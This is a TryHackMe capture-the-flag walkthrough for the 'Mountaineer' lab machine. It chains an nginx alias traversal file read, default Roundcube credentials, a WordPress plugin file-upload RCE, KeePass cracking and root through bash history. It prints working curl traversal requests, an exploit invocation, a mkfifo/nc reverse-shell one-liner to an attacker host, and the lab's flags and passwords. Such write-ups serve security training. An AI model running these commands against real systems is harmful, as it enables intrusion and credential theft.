# TryHackMe — Mountaineer Linux | Full Writeup

**Room:** https://tryhackme.com/room/mountaineerlinux  
**Difficulty:** Hard  
**OS:** Linux (Ubuntu 22.04)

Mountaineer is a multi-stage Linux machine built around a mountain-themed WordPress blog. The chain starts with passive enumeration of a WordPress site, pivots through an nginx alias path-traversal to read server files without authentication, leverages a hidden Roundcube webmail instance to harvest WordPress credentials, uses an authenticated file-upload RCE in the Modern Events Calendar Lite plugin to gain a shell, cracks a KeePass database using a CUPP-generated wordlist built from information found in the same mailbox, and escalates to root via a plaintext password inadvertently logged in a user's bash history.

---

## 1. Reconnaissance

```bash
nmap $IP -p- --open -sV -sC
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    nginx/1.18.0 (Ubuntu)
```

Port 80 returns the default nginx welcome page — the application lives under a sub-path. Directory fuzzing was the logical next step.

```bash
ffuf -u http://$IP/FUZZ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -fc 404
```

**Found:** `/wordpress` → WordPress blog titled **"Mountaineer"**.

Added `mountaineer.thm` to `/etc/hosts`:

```
$IP   mountaineer.thm
```

---

## 2. WordPress Enumeration — WPScan

```bash
wpscan --url http://mountaineer.thm/wordpress -e u
```

**Users discovered:**

```
admin, everest, montblanc, chooyu, k2
```

WPScan's passive plugin scan returned no results. However, inspecting the page source in the browser directly revealed the active plugin in the enqueued stylesheet links:

```html
<link href='.../plugins/modern-events-calendar-lite/assets/css/frontend.min.css?ver=5.16.2' ...>
```

**Plugin identified:** `modern-events-calendar-lite` version **5.16.2** — a version known to be vulnerable to CVE-2021-24145 (authenticated RCE via file upload) and CVE-2021-24146 (unauthenticated event export).

---

## 3. Nginx Off-By-Slash — Unauthenticated Local File Read

While browsing the site, the path `/wordpress/images` was noticed — an unusual endpoint for a WordPress installation, suggesting nginx was serving it directly via a custom `location` block.

Testing a path traversal using the `..` trick:

```bash
curl http://mountaineer.thm/wordpress/images../etc/passwd
```

The full `/etc/passwd` was returned. This is the **nginx off-by-slash (alias traversal)** vulnerability.

**Why it works:** When nginx uses an `alias` directive without a trailing slash on the `location` path, the URL segment is concatenated directly to the alias target. A request to `/wordpress/images../etc/passwd` resolves to `/media/../etc/passwd` = `/etc/passwd`, bypassing the intended restriction entirely.

### Reading the nginx configuration

```bash
curl http://mountaineer.thm/wordpress/images../etc/nginx/sites-available/default
```

The configuration file revealed the exact misconfiguration responsible for the vulnerability:

```nginx
location /wordpress/images {
    alias /media/;
}
```

It also disclosed a **second virtual hostname** in the `server_name` directive:

```nginx
server_name mountaineer.thm adminroundcubemail.mountaineer.thm;
```

Added to `/etc/hosts`:

```
$IP   mountaineer.thm adminroundcubemail.mountaineer.thm
```

---

## 4. Credential Harvesting — Roundcube Webmail

Navigating to `http://adminroundcubemail.mountaineer.thm` presented a Roundcube login page. Given the discovered username `k2`, default credentials were tried first:

**`k2:k2` — authentication successful.**

Inside k2's inbox, two emails were present:

**Email 1 — from `nanga` (subject: "To my favorite mountain out there")**

> *"I've got the perfect password for the perfect mountain: **th3_tall3st_password_in_th3_world**"*

This was k2's password, sent in plaintext.

**Email 2 — from `lhotse` (subject: "Security Risk")**

A warning to k2 to delete emails containing passwords — ironically confirming that sharing credentials via email was an established habit on this system.

Additionally, browsing to k2's **Sent** folder revealed an email containing personal details about user `lhotse` — specifically their name, date, and other profile information. This information was noted for the KeePass cracking phase later.

---

## 5. Initial Shell — CVE-2021-24145 (Authenticated File Upload RCE)

With k2's password in hand, the WordPress login was tested:

```
Username: k2
Password: th3_tall3st_password_in_th3_world
```

Authentication to `/wordpress/wp-admin` succeeded — k2 was a WordPress user.

Modern Events Calendar Lite < 5.16.5 (CVE-2021-24145) allows an authenticated user to upload arbitrary PHP files through the import endpoint (`/wp-admin/admin.php?page=MEC-ix&tab=MEC-import`). The import feature expects a CSV file but only validates the `Content-Type` header — not the actual file content or extension. Spoofing the header to `text/csv` allows a PHP webshell to be uploaded and executed.

```bash
git clone https://github.com/dnr6419/CVE-2021-24145
python3 poc.py -T mountaineer.thm -P 80 -U /wordpress/ \
  -u k2 -p th3_tall3st_password_in_th3_world
```

**Webshell uploaded to:**

```
http://mountaineer.thm/wordpress/wp-content/uploads/shell.php
```

Accessing the URL returned a p0wny interactive webshell running as `www-data`.

### Upgrading to a reverse shell

The p0wny webshell is functional but unstable. A mkfifo named-pipe one-liner was used to catch a proper shell:

```bash
# Attacker machine
nc -lvnp 1234

# Inside p0wny shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST 1234 >/tmp/f
```

Stable interactive shell obtained as `www-data@mountaineer`.

---

## 6. Post-Exploitation — Discovering the KeePass Database

Enumerating home directories:

```bash
ls -la /home/lhotse/
```

```
-rwxrwxrwx  1 lhotse lhotse 2302 Apr  6  2024 Backup.kdbx
```

`Backup.kdbx` is a KeePass database. The permissions are **world-readable and world-writable** — a critical misconfiguration allowing any user on the system to copy and read it.

The file was transferred to the attacker machine using SCP, accessed via k2's SSH credentials discovered earlier:
<img width="1417" height="667" alt="image" src="https://github.com/user-attachments/assets/b6d4048c-20dc-43d9-972c-2205b9d13bdd" />


```bash
ssh k2@$IP
# Password: th3_tall3st_password_in_th3_world

scp k2@$IP:/home/lhotse/Backup.kdbx .
```

---

## 7. Cracking the KeePass Database

### Extracting the hash

```bash
keepass2john Backup.kdbx > keepass.hash
```

### Building a targeted wordlist with CUPP

Rather than using a generic rockyou-style list, the personal details about `lhotse` found in k2's Roundcube Sent folder were used to build a targeted wordlist with CUPP (Common User Password Profiler):

```bash
python3 cupp.py -i
# First Name:  Mount
# Surname:     Lhotse
# Nickname:    MrSecurity
# Birthdate:   18051956
# Pet:         Lhotsy
# Company:     BestMountainsInc
```

CUPP generates combinations of these values with common suffixes, number substitutions, and special character patterns (e.g. `Lhotse56185`, `lhotse1956!`, `MrSecurity18`). The output was saved as `mount.txt`.

### Cracking

```bash
john --wordlist=mount.txt keepass.hash --format=keepass
```

**Master password cracked: `Lhotse56185`**

### Database contents

```bash
kpcli --kdb Backup.kdbx
# Enter master password: Lhotse56185
kpcli:/> cd wordpress-backup/
kpcli:/wordpress-backup> show -f 0
kpcli:/wordpress-backup> show -f 3
```

```
Entry 0 — European Mountain
  Username: mblanc
  Password: GOqNCpo6o38U7JX3PTp0

Entry 3 — The "Security-Mindedness" mountain
  Username: kangchenjunga
  Password: J9f4z7tQlqsPhbf2nlaekD5vzn4yBfpdwUdawmtV
```

---

## 8. SSH as kangchenjunga — User Flag

```bash
ssh kangchenjunga@$IP
# Password: J9f4z7tQlqsPhbf2nlaekD5vzn4yBfpdwUdawmtV
```

```bash
cat ~/local.txt
97a805eb710deb97342a48092876df22
```

---

## 9. Privilege Escalation — Root via Bash History

```bash
cat ~/.bash_history
```

```
ls
cd /var/www/html
nano index.html
cat /etc/passwd
ps aux
suroot
th3_r00t_of_4LL_mount41NSSSSssssss
whoami
...
```

The root user had previously logged into kangchenjunga's account and typed `su root` followed by the root password on the next line. Because bash history was active and not suppressed (`HISTFILE` was not set to `/dev/null`), the password was recorded in plaintext.

```bash
su root
# Password: th3_r00t_of_4LL_mount41NSSSSssssss
```

```bash
cat /root/root.txt
a41824310a621855d9ed507f29eed757
```

---

## Attack Chain

```
nmap ($IP → ports 22, 80)
  └─→ ffuf → /wordpress (WordPress blog)
        └─→ wpscan → users: admin, everest, montblanc, chooyu, k2
              └─→ Page source → modern-events-calendar-lite v5.16.2 (CVE-2021-24145)
                    └─→ /wordpress/images endpoint → nginx off-by-slash LFI
                          └─→ read /etc/nginx/sites-available/default
                                └─→ adminroundcubemail.mountaineer.thm discovered
                                      └─→ Roundcube login: k2:k2 (default creds)
                                            └─→ Inbox: nanga email → k2 password
                                            └─→ Sent: lhotse personal info (for CUPP later)
                                                  └─→ CVE-2021-24145 (k2 WP creds) → webshell → www-data
                                                        └─→ /home/lhotse/Backup.kdbx (world-readable)
                                                              └─→ SSH k2 → scp Backup.kdbx
                                                                    └─→ CUPP (lhotse profile) + john → Lhotse56185
                                                                          └─→ KeePass: kangchenjunga creds
                                                                                └─→ SSH kangchenjunga → local.txt
                                                                                      └─→ ~/.bash_history → root password
                                                                                            └─→ su root → root.txt
```

---

## Key Concepts

| Concept | Explanation |
|---|---|
| **WPScan user enumeration** | WordPress exposes usernames through author archive pages (`/?author=1`) and the REST API. WPScan automates this without needing authentication. |
| **Plugin discovery via page source** | Automated scanners sometimes miss plugins due to version-specific fingerprinting gaps. Viewing page source directly reveals enqueued stylesheets and scripts that include the plugin name and version in their paths. |
| **Nginx off-by-slash (alias traversal)** | When a `location` block using `alias` lacks a trailing slash, appending `..` to the location path causes nginx to resolve files relative to the parent of the aliased directory — enabling arbitrary file read across the filesystem. |
| **Virtual host disclosure via config read** | The nginx `server_name` directive lists all hostnames handled by that server block. Reading the server config via LFI reveals hidden subdomains not advertised publicly. |
| **Default / predictable credentials** | Web applications left at factory defaults or using username-as-password patterns (`k2:k2`) are extremely common findings. Weak credential testing should always precede brute-force. |
| **CVE-2021-24145** | Modern Events Calendar Lite < 5.16.5 — the CSV import endpoint checks only the HTTP `Content-Type` header, not the actual file content. Spoofing it to `text/csv` allows PHP webshell upload and execution. |
| **CUPP targeted wordlist generation** | Generic wordlists like rockyou fail against users with thematic or personal passwords. CUPP creates targeted lists from known personal information (name, birthdate, pet, company), dramatically reducing the search space for specific targets. |
| **KeePass offline cracking** | `keepass2john` converts a `.kdbx` file to a crackable hash format. Once extracted, there is no rate-limiting — the hash can be attacked offline at full speed with John or hashcat. |
| **Bash history credential leakage** | Shell history records every command, including lines typed in the wrong context. A root password entered on the line immediately after `su root` is captured verbatim in `.bash_history` if history is not disabled. |

---

## Flags

| Flag | Path | Value |
|---|---|---|
| local.txt | `/home/kangchenjunga/local.txt` | `97a805eb710deb97342a48092876df22` |
| root.txt | `/root/root.txt` | `a41824310a621855d9ed507f29eed757` |
